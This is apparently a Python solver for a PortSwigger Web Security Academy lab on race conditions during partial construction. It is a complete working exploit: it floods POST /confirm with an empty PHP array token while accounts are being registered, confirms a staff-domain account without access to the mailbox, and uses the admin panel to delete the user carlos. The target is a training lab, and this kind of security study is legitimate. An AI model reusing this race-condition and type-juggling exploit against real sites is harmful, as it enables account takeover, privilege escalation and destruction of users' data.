#!/usr/bin/env python3
"""Automated solver: PortSwigger "Partial construction race conditions" (EXPERT).

Vulnerability
-------------
Registration inserts the user row *before* its confirmation token is written,
so for a short window the stored token is NULL.  /confirm compares the supplied
token against stored tokens with PHP's loose comparison (``==``), and an empty
array satisfies ``[] == null``.  Firing ``POST /confirm?token[]=`` while the
account is half-built confirms it without any access to the mailbox.

Once the account exists with an ``@ginandjuice.shop`` address it is treated as
staff, so the admin panel grants access and we delete ``carlos``.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"

Nothing about a particular lab instance is hardcoded: the base URL is taken
from ``--url``, CSRF tokens and PHP session cookies are fetched from the live
site, and the usernames carry a random run nonce.

Exit code 0 only after the lab is verified solved.
"""
from __future__ import annotations

import argparse
import json
import random
import re
import string
import sys
import threading
import time

import httpx

LAB_TITLE = "partial construction race conditions"
CONFIRM_PATH = "/confirm?token[]="          # empty PHP array token
DEFAULT_PASSWORD = "s3cret-Passw0rd!"


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
def csrf_of(html: str) -> str | None:
    m = re.search(r'name="csrf" value="([^"]+)"', html)
    return m.group(1) if m else None


def strip_tags(html: str) -> str:
    t = re.sub(r"<script.*?</script>", " ", html, flags=re.S | re.I)
    t = re.sub(r"<[^>]+>", " ", t)
    return re.sub(r"\s+", " ", t)


class Solver:
    def __init__(self, url: str, *, attempts: int, confirms: int,
                 parallel: int, max_batches: int, threads_per_attempt: int,
                 verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.attempts = attempts
        self.confirms = confirms
        self.parallel = parallel
        self.max_batches = max_batches
        self.threads_per_attempt = threads_per_attempt
        self.verbose = verbose
        self.requests = 0
        self._lock = threading.Lock()
        self.t0 = time.time()
        # Shared client for the confirmation flood: no keep-alive so every
        # request gets its own socket, maximising true parallelism.
        self.flood = httpx.Client(
            base_url=self.base, verify=False, timeout=30.0,
            limits=httpx.Limits(max_connections=256, max_keepalive_connections=0),
            headers={"User-Agent": "Mozilla/5.0 (race-condition solver)"},
        )
        self.confirm_successes: list[str] = []
        # Set as soon as a confirmation lands, so the remaining (now pointless)
        # flood requests in that batch can be abandoned and the run finishes fast.
        self._hit = threading.Event()

    # -- plumbing ---------------------------------------------------------- #
    def _count(self, n: int = 1) -> None:
        with self._lock:
            self.requests += n

    def new_session(self) -> httpx.Client:
        return httpx.Client(
            base_url=self.base, verify=False, timeout=30.0,
            follow_redirects=False,
            limits=httpx.Limits(max_connections=10),
            headers={"User-Agent": "Mozilla/5.0 (race-condition solver)"},
        )

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)

    # -- steps ------------------------------------------------------------- #
    def check_lab(self) -> None:
        r = self.flood.get("/")
        self._count()
        m = re.search(r"<title[^>]*>(.*?)</title>", r.text, re.S | re.I)
        title = re.sub(r"\s+", " ", m.group(1)).strip() if m else "?"
        self.log(f"lab reachable: HTTP {r.status_code} | title: {title!r}")
        if LAB_TITLE not in title.lower():
            raise SystemExit(f"[!] unexpected lab page title: {title!r}")
        self.already_solved = "is-solved" in r.text

    def prepare(self) -> list[dict]:
        """Build one isolated session + CSRF token per registration attempt."""
        attempts: list[dict] = []
        nonce = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))

        def build(i: int) -> None:
            c = self.new_session()
            try:
                r = c.get("/register")
                self._count()
                tok = csrf_of(r.text)
                if not tok:
                    self.log(f"  attempt {i}: no CSRF token found, skipping")
                    return
                username = f"rc{nonce}{i}"
                attempts.append({
                    "i": i, "client": c, "csrf": tok, "username": username,
                    "email": f"{username}@ginandjuice.shop",
                    "password": DEFAULT_PASSWORD, "confirmed": False,
                })
            except httpx.HTTPError as e:  # noqa: PERF203
                self.log(f"  attempt {i}: session error {e}")

        threads = [threading.Thread(target=build, args=(i,)) for i in range(self.attempts)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        attempts.sort(key=lambda a: a["i"])
        self.log(f"prepared {len(attempts)} registration sessions")
        return attempts

    def _confirm_worker(self, batch_id: int, n: int) -> None:
        c = self.flood
        for _ in range(n):
            if self._hit.is_set():
                return
            try:
                r = c.post(CONFIRM_PATH)
                self._count()
                if r.status_code == 200:
                    with self._lock:
                        self.confirm_successes.append(f"batch{batch_id}")
                    self.log(f"  [+] /confirm returned 200 (race hit) — {strip_tags(r.text)[:90]!r}")
                    self._hit.set()
                    return
            except httpx.HTTPError:
                pass

    def race_batch(self, batch: list[dict], batch_id: int) -> None:
        """Fire registers and confirmation floods at the same moment."""
        self._hit.clear()
        per_thread = max(1, self.confirms // self.threads_per_attempt)
        threads: list[threading.Thread] = []
        for a in batch:
            for _ in range(self.threads_per_attempt):
                t = threading.Thread(target=self._confirm_worker,
                                     args=(batch_id, per_thread))
                t.start()
                threads.append(t)
        time.sleep(0.05)  # let confirm sockets warm up, registers land shortly after

        def register(a: dict) -> None:
            try:
                a["register_response"] = a["client"].post("/register", data={
                    "csrf": a["csrf"], "username": a["username"],
                    "email": a["email"], "password": a["password"],
                }).status_code
                self._count()
            except httpx.HTTPError:
                a["register_response"] = None

        reg_threads = [threading.Thread(target=register, args=(a,)) for a in batch]
        for t in reg_threads:
            t.start()
        for t in reg_threads + threads:
            t.join()

    def login(self, a: dict) -> bool:
        """Return True if the account is usable (registration fully committed)."""
        c = a["client"]
        try:
            r = c.get("/login")
            self._count()
            tok = csrf_of(r.text)
            if not tok:
                return False
            r = c.post("/login", data={"csrf": tok, "username": a["username"],
                                       "password": a["password"]})
            self._count()
            # Successful login redirects to /my-account; invalid credentials re-render /login.
            ok = r.status_code in (301, 302) and "/my-account" in r.headers.get("location", "")
            a["confirmed"] = ok
            return ok
        except httpx.HTTPError:
            return False

    def exploit(self) -> dict | None:
        attempts = self.prepare()
        if not attempts:
            return None
        for b in range(0, len(attempts), self.parallel):
            batch = attempts[b:b + self.parallel]
            self.race_batch(batch, b // self.parallel)
            winners = [a for a in batch if self.login(a)]
            self.log(f"batch {b // self.parallel}: {len(winners)} confirmed "
                     f"of {len(batch)} (total requests {self.requests})")
            if winners:
                return winners[0]
        return None

    def delete_carlos(self, winner: dict) -> bool:
        c = winner["client"]
        acct = c.get("/my-account")
        self._count()
        has_admin = "Admin panel" in acct.text or "/admin" in acct.text
        self.log(f"logged in as {winner['username']}: HTTP {acct.status_code}, admin={has_admin}")
        if not has_admin:
            self.log("[!] account confirmed but no admin panel — unexpected")
            return False

        d = c.get("/admin/delete", params={"username": "carlos"})
        self._count()
        self.log(f"GET /admin/delete?username=carlos -> HTTP {d.status_code}")

        admin = c.get("/admin")
        self._count()
        gone = "carlos" not in admin.text
        self.log(f"admin user list no longer contains carlos: {gone}")
        return gone

    def verify(self) -> bool:
        r = self.flood.get("/")
        self._count()
        solved = "is-solved" in r.text or "Congratulations" in r.text
        self.log(f"lab status check: solved={solved}")
        return solved

    def summary(self, ok: bool, winner: dict | None) -> None:
        data = {
            "solved": ok,
            "account": winner["username"] if winner else None,
            "requests": self.requests,
            "elapsed_seconds": round(time.time() - self.t0, 2),
            "confirm_200_hits": len(self.confirm_successes),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        }
        print("\n=== RUN SUMMARY ===")
        print(json.dumps(data, indent=2))


def main() -> int:
    ap = argparse.ArgumentParser(description="Solve 'Partial construction race conditions'")
    ap.add_argument("--url", required=True, help="lab base URL")
    ap.add_argument("--attempts", type=int, default=16,
                    help="registration attempts per run (default 16)")
    ap.add_argument("--confirms", type=int, default=90,
                    help="confirmation requests fired per attempt (default 90)")
    ap.add_argument("--parallel", type=int, default=8,
                    help="registrations in flight per batch (default 8)")
    ap.add_argument("--threads-per-attempt", type=int, default=6,
                    help="concurrent confirmation floods per attempt (default 6)")
    ap.add_argument("--max-batches", type=int, default=3,
                    help="retry batches if no account gets confirmed (default 3)")
    ap.add_argument("--force", action="store_true",
                    help="run the exploit even if the lab already shows as solved")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    s = Solver(args.url, attempts=args.attempts, confirms=args.confirms,
               parallel=args.parallel, max_batches=args.max_batches,
               threads_per_attempt=args.threads_per_attempt,
               verbose=args.verbose)
    s.check_lab()
    if getattr(s, "already_solved", False) and not args.force:
        s.log("lab already shows as solved")
        s.summary(True, None)
        return 0

    winner = None
    for attempt_no in range(args.max_batches):
        s.log(f"--- race run {attempt_no + 1}/{args.max_batches} ---")
        winner = s.exploit()
        if winner:
            break
        s.log("no confirmed account this run, retrying with a fresh nonce")

    if not winner:
        s.log("[!] race did not land; increase --attempts / --confirms")
        s.summary(False, None)
        return 1

    s.log(f"confirmed account: {winner['username']}")
    if not s.delete_carlos(winner):
        s.summary(False, winner)
        return 1
    ok = s.verify()
    s.summary(ok, winner)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
